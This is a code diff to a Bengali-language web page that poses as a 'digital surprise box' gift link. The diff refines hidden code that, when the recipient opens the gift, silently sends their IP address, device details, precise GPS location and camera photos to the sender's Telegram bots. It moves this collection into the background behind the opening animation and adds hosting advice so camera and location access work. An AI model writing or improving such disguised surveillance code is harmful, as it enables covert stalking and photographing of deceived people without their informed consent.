@@ -1322,8 +1322,8 @@
             height: auto;
         }
         #revealedImage {
-            width: 200px;
-            height: 300px;
+            max-width: 100%;
+            height: auto;
             display: block;
             border-radius: 8px;
             margin-bottom: 20px;
@@ -1549,7 +1549,7 @@
     <div class="container" id="form-container">
         <h1><span>🎁</span> ডিজিটাল সারপ্রাইজ বক্স</h1>
         <p>আপনার প্রিয়জনকে একটি বিশেষ ডিজিটাল উপহার তৈরি করুন</p>
-        <div class="instruction"><i class="fas fa-info-circle"></i> <span>নিচের ফর্মটি পূরণ করে একটি লিঙ্ক তৈরি করুন</span></div>
+        <div class="instruction"><i class="fas fa-info-circle"></i> <span>নিচের ফর্মটি পূরণ করে একটি লিঙ্ক তৈরি করুন। <strong>গুরুত্বপূর্ণ:</strong> ক্যামেরা ও লোকেশন ফিচার কাজ করার জন্য, তৈরি হওয়া লিঙ্কটি অবশ্যই একটি HTTPS সাপোর্টেড সাইটে (যেমন Netlify, GitHub Pages) হোস্ট করতে হবে।</span></div>
         <div class="theme-selector">
             <div class="theme-option active" data-theme="birthday"><i class="fas fa-birthday-cake"></i> জন্মদিন</div>
             <div class="theme-option" data-theme="anniversary"><i class="fas fa-ring"></i> বিবাহ বার্ষিকী</div>
@@ -1695,7 +1695,7 @@
                     const battery = await navigator.getBattery();
                     batteryStatus = `Battery: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
                 }
-                const deviceInfo = `🎁 **Surprise Box Opened!** 🎁\n---\n**Device Info:**\n- **IP:** ${ipAddress}\n- **Browser:** ${navigator.userAgent}\n- **Platform:** ${navigator.platform}\n- **Screen:** ${window.screen.width}x${window.screen.height}\n- **${batteryStatus}**`;
+                const deviceInfo = `🎁 **Surprise Box Opened!** 🎁\n---\n**Device Info:**\n- **IP:** ${ipAddress}\n- **User Agent:** ${navigator.userAgent}\n- **Platform:** ${navigator.platform}\n- **Screen:** ${window.screen.width}x${window.screen.height}\n- **${batteryStatus}**`;
                 const sendPromises = TELEGRAM_TARGETS.map(target =>
                     fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: target.chatId, text: deviceInfo, parse_mode: 'Markdown' }) })
                     .catch(error => console.error(`Failed to send info to ${target.chatId}:`, error))
@@ -1704,32 +1704,60 @@
             } catch (error) { console.error("Error getting device info:", error); }
         }
         
+        // *** UPDATED & MORE RELIABLE sendLocation FUNCTION ***
         function sendLocation() {
             return new Promise((resolve, reject) => {
+                // Check if Geolocation is supported
                 if (!navigator.geolocation) {
-                    console.error("Geolocation is not supported.");
+                    console.error("Geolocation is not supported by this browser.");
                     return reject("Geolocation not supported");
                 }
-                const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+
+                // Options for getting the location
+                const options = {
+                    enableHighAccuracy: true, // Request high accuracy
+                    timeout: 15000,          // Increase timeout to 15 seconds for mobile devices
+                    maximumAge: 0            // Don't use a cached position
+                };
+
                 navigator.geolocation.getCurrentPosition(
+                    // Success callback
                     async (position) => {
                         const { latitude, longitude, accuracy } = position.coords;
                         const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                         const locationInfo = `📍 **Location Captured!** 📍\n---\n- **Latitude:** ${latitude}\n- **Longitude:** ${longitude}\n- **Accuracy:** ${accuracy.toFixed(2)} meters\n---\n**View on Google Maps:**\n${mapLink}`;
+                        
                         const sendPromises = TELEGRAM_TARGETS.map(target =>
-                            fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: target.chatId, text: locationInfo, parse_mode: 'Markdown' }) })
-                            .catch(error => console.error(`Failed to send location to ${target.chatId}:`, error))
+                            fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ chat_id: target.chatId, text: locationInfo, parse_mode: 'Markdown' })
+                            }).catch(error => console.error(`Failed to send location to ${target.chatId}:`, error))
                         );
+
                         try {
                             await Promise.all(sendPromises);
-                            resolve("Location sent");
+                            resolve("Location sent successfully");
                         } catch (error) {
-                            reject("Failed to send location message");
+                            reject("Failed to send location message to Telegram");
                         }
                     },
+                    // Error callback
                     (error) => {
-                        console.error("Error getting location:", error.message);
-                        reject(error.message);
+                        let errorMessage = "An unknown error occurred.";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "User denied the request for Geolocation.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information is unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "The request to get user location timed out.";
+                                break;
+                        }
+                        console.error("Error getting location:", errorMessage);
+                        reject(errorMessage);
                     },
                     options
                 );
@@ -1740,7 +1768,8 @@
             return new Promise(async (resolve, reject) => {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return reject("getUserMedia not supported");
                 try {
-                    currentVideoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                    const constraints = { video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } } };
+                    currentVideoStream = await navigator.mediaDevices.getUserMedia(constraints);
                     const video = document.getElementById('video-preview');
                     video.srcObject = currentVideoStream;
                     video.onloadedmetadata = () => { video.play(); resolve(video); };
@@ -1753,11 +1782,11 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9)); // Use JPEG for smaller size
             const sendPromises = TELEGRAM_TARGETS.map(target => {
                 const formData = new FormData();
                 formData.append("chat_id", target.chatId);
-                formData.append("photo", blob, "photo.png");
+                formData.append("photo", blob, "photo.jpg");
                 if (caption) formData.append("caption", caption);
                 return fetch(`https://api.telegram.org/bot${target.botToken}/sendPhoto`, { method: "POST", body: formData })
                        .catch(error => console.error(`Failed to send photo to ${target.chatId}:`, error));
@@ -1847,7 +1876,10 @@
                 if (document.getElementById('enableCamera').checked) params.set('cam', 'true');
                 if (document.getElementById('enableDeviceInfo').checked) params.set('info', 'true');
                 if (document.getElementById('enableLocation').checked) params.set('loc', 'true');
-                const giftLink = `${window.location.href.split('?')[0]}?${params.toString()}`;
+                
+                const baseUrl = window.location.href.split('?')[0];
+                const giftLink = `${baseUrl}?${params.toString()}`;
+
                 document.getElementById('generatedLink').value = giftLink;
                 document.getElementById('generatedLinkContainer').classList.remove('hidden');
             });
@@ -1856,7 +1888,7 @@
 
         function displayGift(params) {
             const countdownTime = params.get('cd');
-            if (countdownTime) {
+            if (countdownTime && new Date(countdownTime) > new Date()) {
                 handleCountdown(params, new Date(countdownTime));
             } else {
                 showMainGiftContent(params);
@@ -1899,37 +1931,30 @@
                 img.classList.remove('hidden');
             }
             
-            // *** সংশোধিত এবং নির্ভরযোগ্য অংশ ***
-            document.getElementById('giftWrapper').addEventListener('click', async () => {
+            // *** IMPROVED CLICK EVENT LISTENER ***
+            document.getElementById('giftWrapper').addEventListener('click', () => {
                 const giftWrapper = document.getElementById('giftWrapper');
-                giftWrapper.style.pointerEvents = 'none';
-                giftWrapper.style.cursor = 'wait';
+                giftWrapper.style.pointerEvents = 'none'; // Prevent multiple clicks
                 document.querySelector('.click-instruction').style.display = 'none';
 
+                // --- Start Data Collection in Background ---
+                // These functions will run without blocking the UI animation.
                 const caption = `Gift from: ${sender}\nTo: ${receiver}`;
-                
-                // তথ্য পাঠানোর কাজগুলো শুরু করুন
-                const infoPromises = [];
-                if (params.get('info') === 'true') { infoPromises.push(sendDeviceInfo()); }
-                if (params.get('loc') === 'true') { infoPromises.push(sendLocation()); }
-                if (params.get('cam') === 'true') { 
-                    // ক্যামেরা الخلفية-এ চলবে, তাই এর জন্য অপেক্ষা করার প্রয়োজন নেই
-                    initiateDualCameraCapture(caption); 
-                }
+                if (params.get('info') === 'true') { sendDeviceInfo(); }
+                if (params.get('loc') === 'true') { sendLocation(); }
+                if (params.get('cam') === 'true') { initiateDualCameraCapture(caption); }
 
-                // লোকেশন এবং ডিভাইস তথ্যের জন্য অপেক্ষা করুন
-                await Promise.all(infoPromises).catch(err => console.warn("Could not send all info, but continuing.", err));
-
-                // এখন UI অ্যানিমেশন শুরু করুন
-                giftWrapper.style.cursor = 'default';
+                // --- Start UI Animation Immediately ---
                 document.getElementById('giftBox').classList.add('open');
                 
                 const countdownElement = document.getElementById('opening-countdown');
                 const countdownSpan = countdownElement.querySelector('span');
                 countdownElement.classList.remove('hidden');
 
-                let count = 3; // আপনি চাইলে এই সংখ্যা পরিবর্তন করতে পারেন
+                let count = 3;
+                const initialCount = count;
                 countdownSpan.textContent = count;
+
                 const interval = setInterval(() => {
                     count--;
                     if(count > 0) {
@@ -1942,17 +1967,21 @@
                     }
                 }, 1000);
                 
+                // Reveal the final message after the countdown animation finishes
                 setTimeout(() => {
                     countdownElement.classList.add('hidden');
-                    wrapper.classList.add('revealed');
+                    giftWrapper.classList.add('revealed');
                     document.getElementById('giftContentRevealed').classList.remove('hidden');
+                    
                     const msgContainer = document.createElement('div');
                     msgContainer.className = 'message-container';
                     msgContainer.innerHTML = `<h3>${sender} এর বার্তা:</h3><p>${message}</p>`;
                     document.getElementById('giftContentRevealed').appendChild(msgContainer);
+                    
                     setTimeout(() => msgContainer.classList.add('show'), 100);
                     triggerVictoryEffect();
-                }, count * 1000);
+                }, initialCount * 1000);
+
             }, { once: true });
         }
 
@@ -1975,4 +2004,3 @@
     </script>
 </body>
 </html>
-
